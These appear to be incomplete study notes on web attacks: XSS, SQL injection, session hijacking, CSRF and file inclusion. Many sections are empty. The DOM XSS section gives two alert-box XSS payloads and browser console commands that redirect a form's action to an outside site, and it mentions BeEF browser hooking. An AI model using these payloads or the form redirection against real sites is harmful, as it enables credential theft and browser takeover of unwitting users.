# Web Attacks

# Input Validation Attacks
* attack triggered by user input, where input subverts the anticipated function of an application because of insufficient validation on client or server side.

## Cross-Site Scripting (XSS)
* where malicious scripts are injected browser side into otherwise benign and trusted websites.
* XSS are usually found on forms and fields in the website.

### Types of XSS
1. [Reflected XSS](#Reflected-XSS)
   * [Reflected XSS](https://owasp.org/www-community/attacks/xss/) are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
2. [Stored XSS](#Stored-XSS)
   * [Stored attacks](https://owasp.org/www-community/attacks/xss/) are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. 
3. [DOM XSS](#DOM-XSS)
* [DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) is where attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. Thus the page itself does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

### Goal of XSS
* Goal of XSS is the same regardless of the type of XSS. The only difference is how the payload arrives at the server.
1. Cookie Stealing
2. Getting Complete Control over a Browser
3. Initiating Exploitation Phasse against Browser Plugins which will Lateral Move to the Machine
4. Keylogging

#### Reflected XSS


#### Stored XSS

#### DOM XSS

1. Test
(1) This test script tries to load a bogus img and on error creates an alert box
```
"><img src='aaa' onerror="alert(document.domain)">
```
(2) This test script builds an svg element which is an alert box
```
"><svg/onload="alert(document.domain)">
```

2. Exploit
   * Browser ---> Developer ---> Console
   * In console, we want to try to modify the form action.
```
clear() // clear the console
document.forms // command to list out all forms on the page and locate the targeted form.
document.forms[x].action="//example.com" // x is the index of the targeted form and example.com will be the redirection site
```

#### BeEF-XSS 
- Browser Exploitation Framework project.
- using xss to hook BeEF's hook.js
- controlling browser with BeEF.



## SQL Injections (SQLi)
* a type of attack in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

### Finding SQLi
1. Find Injection Point
2. aaa

### Exploiting SQLi
#### In-Band SQLi
#### Error-based SQLi
#### Blind SQLi

#### Automated Tool (SQLMap)



# Session & Logic Attacks
## Session Hijacking & Fixation
1. Session Hijacking via XSS Cookie Stealing
2. Session Hijacking via wireshark
3. Session Hijacking via Access to Webserver
4. Session Fixation Attack

## Cross-Site Request Forgery (CSRF)

## Files and Resources Vulnerabilities
1. Local File Inclusion attacks
2. Remote File Inclusion attacks
3. Unrestricted File Upload
